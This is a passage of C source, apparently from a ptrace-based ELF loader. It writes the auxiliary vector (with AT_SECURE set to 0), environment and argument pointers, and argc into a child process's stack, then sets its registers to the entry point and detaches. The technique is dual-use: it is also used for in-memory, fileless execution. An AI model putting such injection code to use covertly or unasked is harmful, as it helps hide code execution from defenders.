	// AT_PAGESZ
	auxiliary_vector[3].type = AT_PAGESZ;
	auxiliary_vector[3].data = 4096;
	
	// AT_CLKTCK
	auxiliary_vector[4].type = AT_CLKTCK;
	auxiliary_vector[4].data = 100;
	
	// AT_PHDR
	auxiliary_vector[5].type = AT_PHDR;
	auxiliary_vector[5].data = base_address + pElf64_Ehdr->e_phoff;
	
	// AT_PHENT
	auxiliary_vector[6].type = AT_PHENT;
	auxiliary_vector[6].data = pElf64_Ehdr->e_phentsize;
	
	// AT_PHNUM
	auxiliary_vector[7].type = AT_PHNUM;
	auxiliary_vector[7].data = pElf64_Ehdr->e_phnum;
	
	// AT_BASE
	auxiliary_vector[8].type = AT_BASE;
	if(pElf64_Ehdr->e_type == ET_DYN){
		auxiliary_vector[8].data = interpreter_base_address;
	}else{
		auxiliary_vector[8].data = base_address;
	}
	
	// AT_FLAGS
	auxiliary_vector[9].type = AT_FLAGS;
	auxiliary_vector[9].data = 0x0;

	// AT_ENTRY
	auxiliary_vector[10].type = AT_ENTRY;
	auxiliary_vector[10].data = base_address + pElf64_Ehdr->e_entry;
	
	// AT_UID
	auxiliary_vector[11].type = AT_UID;
	auxiliary_vector[11].data = real_uid;
	
	// AT_EUID
	auxiliary_vector[12].type = AT_EUID;
	auxiliary_vector[12].data = effective_uid;
	
	// AT_GID
	auxiliary_vector[13].type = AT_GID;
	auxiliary_vector[13].data = real_gid;
	
	// AT_EGID
	auxiliary_vector[14].type = AT_EGID;
	auxiliary_vector[14].data = effective_gid;
	
	// AT_SECURE
	auxiliary_vector[15].type = AT_SECURE;
	auxiliary_vector[15].data = 0;
	
	// AT_RANDOM
	auxiliary_vector[16].type = AT_RANDOM;
	auxiliary_vector[16].data = AT_RANDOM_data_start_address;
	
	// AT_HWCAP2
	auxiliary_vector[17].type = AT_HWCAP2;
	auxiliary_vector[17].data = 0x2;
	
	// AT_EXECFN
	auxiliary_vector[18].type = AT_EXECFN;
	auxiliary_vector[18].data = AT_EXECFN_data_start_address;
	
	// AT_PLATFORM
	auxiliary_vector[19].type = AT_PLATFORM;
	auxiliary_vector[19].data = AT_PLATFORM_data_start_address;
	
	// AT_NULL
	auxiliary_vector[20].type = AT_NULL;
	auxiliary_vector[20].data = 0;
	
	length = auxv_count * sizeof(AUX_VECTOR);
	buffer = (unsigned char *)auxiliary_vector;
	auxv_start_address = auxv_data_start_address - length - zero_padding_count * sizeof(unsigned long);
	address = auxv_start_address;
		
	for(unsigned long j=0; j<length; j+=sizeof(unsigned long), address+=sizeof(unsigned long)){
		data = ((unsigned long *)buffer)[j/sizeof(unsigned long)];
		if(ptrace(PTRACE_POKETEXT, cpid, address, data) != 0){
#ifdef _DEBUG
			printf("[E] ptrace(PTRACE_POKETEXT) error.\n");
#endif
			return 1;
		}
#ifdef _DEBUG
		printf("[I] write address:0x%lx data:0x%lx\n", address, data);
#endif
	}
	
	
#ifdef _DEBUG
	printf("[I] write env pointers in the stack memory.\n");
#endif
	buffer = NULL;
	length = 0;
	address = 0;
	data = 0;
	
	length = (env_count + 1) * sizeof(unsigned long);
	buffer = (unsigned char *)env_address;
	env_start_address = auxv_start_address - length;
	address = env_start_address;
		
	for(unsigned long j=0; j<length; j+=sizeof(unsigned long), address+=sizeof(unsigned long)){
		data = ((unsigned long *)buffer)[j/sizeof(unsigned long)];
		if(ptrace(PTRACE_POKETEXT, cpid, address, data) != 0){
#ifdef _DEBUG
			printf("[E] ptrace(PTRACE_POKETEXT) error.\n");
#endif
			return 1;
		}
#ifdef _DEBUG
		printf("[I] write address:0x%lx data:0x%lx\n", address, data);
#endif
	}
	
	
#ifdef _DEBUG
	printf("[I] write argv pointers in the stack memory.\n");
#endif
	buffer = NULL;
	length = 0;
	address = 0;
	data = 0;
	
	length = (argv_count + 1) * sizeof(unsigned long);
	argv_start_address = env_start_address - length;
	buffer = (unsigned char *)argv_address;
	address = argv_start_address;
		
	for(unsigned long j=0; j<length; j+=sizeof(unsigned long), address+=sizeof(unsigned long)){
		data = ((unsigned long *)buffer)[j/sizeof(unsigned long)];
		if(ptrace(PTRACE_POKETEXT, cpid, address, data) != 0){
#ifdef _DEBUG
			printf("[E] ptrace(PTRACE_POKETEXT) error.\n");
#endif
			return 1;
		}
#ifdef _DEBUG
		printf("[I] write address:0x%lx data:0x%lx\n", address, data);
#endif
	}
	
	
#ifdef _DEBUG
	printf("[I] write argc value in the stack memory.\n");
#endif
	buffer = NULL;
	length = 0;
	address = 0;
	data = 0;
	
	length = sizeof(unsigned long);
	argc_start_address = argv_start_address - length;
	address = argc_start_address;
	data = (unsigned long)argv_count;
	
	if(ptrace(PTRACE_POKETEXT, cpid, address, data) != 0){
#ifdef _DEBUG
		printf("[E] ptrace(PTRACE_POKETEXT) error.\n");
#endif
		return 1;
	}
#ifdef _DEBUG
	printf("[I] write address:0x%lx data:0x%lx\n", address, data);
#endif
	stack_pointer = argc_start_address;
	
	
#ifdef _DEBUG
	printf("[I] set entry point and stack pointer.\n");
#endif
	regs.rax = 0;
	regs.rbx = 0;
	regs.rcx = 0;
	regs.rdx = 0;
	regs.rsi = 0;
	regs.rdi = 0;
	regs.rbp = 0;
	regs.rsp = stack_pointer;
	regs.r8 = 0;
	regs.r9 = 0;
	regs.r10 = 0;
	regs.r11 = 0;
	regs.r12 = 0;
	regs.r13 = 0;
	regs.r14 = 0;
	regs.r15 = 0;
	regs.rip = entry_point;
	
	if(ptrace(PTRACE_SETREGS, cpid, NULL, &regs) != 0){
#ifdef _DEBUG
		printf("[E] ptrace(PTRACE_SETREGS) error.\n");
#endif
		return 1;
	}
	
	
#ifdef _DEBUG
	printf("[I] detach the child process.\n");
#endif
	if(ptrace(PTRACE_DETACH, cpid, NULL, NULL) != 0){
#ifdef _DEBUG
		printf("[E] ptrace(PTRACE_DETACH) error.\n");
#endif
		return 1;
	}
	
	return 0;
}

